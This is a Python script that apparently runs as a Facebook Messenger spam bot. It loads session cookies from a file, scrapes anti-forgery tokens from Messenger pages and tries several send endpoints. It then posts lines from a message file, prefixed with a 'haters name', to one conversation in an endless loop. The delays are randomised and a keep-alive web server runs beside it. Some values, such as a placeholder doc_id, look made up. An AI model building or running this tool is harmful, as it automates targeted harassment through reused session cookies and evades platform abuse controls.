import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import random
import re

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Server is Running")

def execute_server():
    PORT = int(os.getenv('PORT', 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def get_fb_cookies():
    try:
        with open('cookies.txt', 'r') as file:
            cookies_content = file.read().strip().strip('[]')
            cookies = {}
            
            for part in cookies_content.split(';'):
                part = part.strip()
                if '=' in part:
                    key, value = part.split('=', 1)
                    cookies[key.strip()] = value.strip()
            
            print(f"[DEBUG] Parsed Cookies: {list(cookies.keys())}")
            if not all(k in cookies for k in ['c_user', 'xs']):
                print("[ERROR] Missing required cookies (c_user or xs)")
                return None
            return cookies
            
    except Exception as e:
        print(f"[ERROR] Cookie parsing failed: {str(e)}")
        return None

def send_message_with_cookies(cookies, convo_id, message):
    headers = {
        'authority': 'm.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'referer': f'https://m.facebook.com/messages/thread/{convo_id}/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    }
    
    session = requests.Session()
    for name, value in cookies.items():
        session.cookies.set(name, value, domain='.facebook.com')
    
    try:
        print(f"[DEBUG] Loading mobile conversation page...")
        res = session.get(f'https://m.facebook.com/messages/thread/{convo_id}/', headers=headers, allow_redirects=True)
        print(f"[DEBUG] Page response status: {res.status_code}")
        print(f"[DEBUG] Final URL: {res.url}")
        
        if res.status_code != 200:
            print(f"[ERROR] Failed to load page. Status: {res.status_code}")
            with open('debug.html', 'w', encoding='utf-8') as f:
                f.write(res.text[:50000])
            print(f"[DEBUG] Response saved to debug.html")
            return False
        
        fb_dtsg = None
        jazoest = None
        
        token_patterns = [
            r'"dtsg":"([^"]+)"',
            r'name="fb_dtsg"[^>]*value="([^"]+)"',
            r'"token":"([^"]+)"',
            r'"DTSGInitialData"[^}]*"token":"([^"]+)"',
            r'\["DTSGInitData"[^\]]*"([^"]+)"',
            r'fb_dtsg" value="([^"]+)"',
            r'\\"token\\":\\"([^"]+)\\"',
            r'window\.wlct\.dtsg\s*=\s*"([^"]+)"'
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, res.text)
            if match:
                fb_dtsg = match
                print(f"[DEBUG] fb_dtsg found: {match.group(1)[:20]}...")
                break
        
        jazoest_patterns = [
            r'name="jazoest"[^>]*value="(\d+)"',
            r'jazoest=(\d+)',
            r'"jazoest":"(\d+)"',
            r'&amp;jazoest=(\d+)',
            r'jazoest" value="(\d+)"'
        ]
        
        for pattern in jazoest_patterns:
            match = re.search(pattern, res.text)
            if match:
                jazoest = match
                print(f"[DEBUG] jazoest found: {match.group(1)}")
                break
        
        if not fb_dtsg:
            print("[ERROR] Could not extract fb_dtsg token")
            with open('debug.html', 'w', encoding='utf-8') as f:
                f.write(res.text[:100000])
            print("[DEBUG] Response saved to debug.html for inspection")
            print("[HINT] Cookies might be expired or Facebook changed its format")
            return False
        
        if not jazoest:
            print("[WARNING] Could not extract jazoest, trying without it...")
            jazoest_value = "2" + str(sum(ord(c) for c in fb_dtsg.group(1)))
        else:
            jazoest_value = jazoest.group(1)
            
        print(f"[DEBUG] Tokens extracted successfully")
        
        timestamp_ms = str(int(time.time() * 1000))
        client_mutation_id = f"{timestamp_ms}:{random.randint(0, 999999)}"
        
        form_data = {
            'fb_dtsg': fb_dtsg.group(1),
            'jazoest': jazoest_value,
            '__user': cookies['c_user'],
            '__a': '1',
            '__dyn': '',
            '__csr': '',
            '__req': '1',
            '__hs': '',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1000000',
            '__s': '',
            '__hsi': '',
            '__comet_req': '0',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'MessengerThreadMediaSendMutation',
            'variables': json.dumps({
                'input': {
                    'thread_id': convo_id,
                    'text': message,
                    'client_mutation_id': client_mutation_id,
                    'actor_id': cookies['c_user'],
                }
            }),
            'doc_id': '1234567890'
        }
        
        simple_form_data = {
            'fb_dtsg': fb_dtsg.group(1),
            'jazoest': jazoest_value,
            'body': message,
            'tids': convo_id,
            'send': '1',
            '__user': cookies['c_user'],
            '__a': '1',
            '__req': 'g',
            '__rev': '1000000'
        }
        
        post_headers = headers.copy()
        post_headers['content-type'] = 'application/x-www-form-urlencoded'
        post_headers['origin'] = 'https://m.facebook.com'
        post_headers['referer'] = f'https://m.facebook.com/messages/thread/{convo_id}/'
        
        endpoints_and_data = [
            (f'https://m.facebook.com/messages/compose/', simple_form_data),
            (f'https://www.facebook.com/messaging/send/?dpr=1', form_data),
            (f'https://m.facebook.com/messages/send/?icm=1', simple_form_data),
        ]
        
        last_response = None
        for endpoint, data in endpoints_and_data:
            print(f"[DEBUG] Trying endpoint: {endpoint}")
            print(f"[DEBUG] Sending message: '{message[:50]}...'")
            print(f"[DEBUG] Thread ID: {convo_id}")
            response = session.post(endpoint, data=data, headers=post_headers, allow_redirects=True)
            last_response = response
            print(f"[DEBUG] Response status: {response.status_code}")
            
            if response.status_code == 200:
                resp_text = response.text[:2000]
                print(f"[DEBUG] Response snippet: {resp_text[:300]}")
                
                if 'redirect' not in resp_text.lower() or 'success' in resp_text.lower():
                    if 'error' not in resp_text.lower() and 'broken' not in resp_text.lower():
                        print(f"[SUCCESS] Message likely sent using {endpoint}")
                        return True
                    else:
                        print(f"[WARNING] Response may contain error")
                        continue
            elif response.status_code == 302:
                redirect_url = response.headers.get('Location', '')
                print(f"[DEBUG] Redirected to: {redirect_url}")
                if 'error' not in redirect_url.lower():
                    print(f"[SUCCESS] Message sent (302 redirect)")
                    return True
        
        if last_response:
            print(f"[DEBUG] All endpoints failed. Last response: {last_response.text[:500]}")
        else:
            print(f"[DEBUG] All endpoints failed. No response received.")
        return False
    
    except Exception as e:
        print(f"[ERROR] Message sending failed: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

def send_messages():
    print("[+] Starting message sender...")
    
    cookies = get_fb_cookies()
    if not cookies:
        print("[ERROR] Invalid cookies - stopping")
        return
    
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()
            print(f"[DEBUG] Conversation ID: {convo_id}")
    except Exception as e:
        print(f"[ERROR] Reading convo.txt: {str(e)}")
        return
    
    try:
        with open('file.txt', 'r') as file:
            text_file_path = file.read().strip()
        with open(text_file_path, 'r') as file:
            messages = [line.strip() for line in file.readlines() if line.strip()]
            print(f"[DEBUG] Loaded {len(messages)} messages")
    except Exception as e:
        print(f"[ERROR] Reading messages: {str(e)}")
        return
    
    try:
        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()
    except:
        haters_name = ""
    
    try:
        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())
    except:
        speed = 5
    
    print("[+] Starting message loop...")
    while True:
        try:
            for i, message in enumerate(messages):
                full_message = f"{haters_name} {message}" if haters_name else message
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                
                if send_message_with_cookies(cookies, convo_id, full_message):
                    print(f"[+] Message {i+1}/{len(messages)} sent | {current_time}")
                else:
                    print(f"[-] Failed to send message {i+1} | {current_time}")
                
                time.sleep(speed + random.uniform(-1, 1))
            
            print("[+] Message cycle completed. Restarting...")
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            time.sleep(30)

def main():
    print("[+] Starting server and message sender...")
    server_thread = threading.Thread(target=execute_server, daemon=True)
    server_thread.start()
    send_messages()

if __name__ == '__main__':
    main()
